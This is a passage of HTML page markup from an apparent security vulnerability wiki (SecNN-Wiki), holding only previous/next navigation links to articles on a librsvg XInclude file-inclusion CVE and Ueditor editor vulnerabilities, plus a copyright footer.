      <a href="../librsvg%20XInclude%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%20CVE-2023-38633/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../librsvg%20XInclude%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%20CVE-2023-38633/" class="btn btn-xs btn-link">
        librsvg XInclude 文件包含漏洞 CVE-2023-38633
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Ueditor%20%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Ueditor%20%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="btn btn-xs btn-link">
        Ueditor 编辑器漏洞总结
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>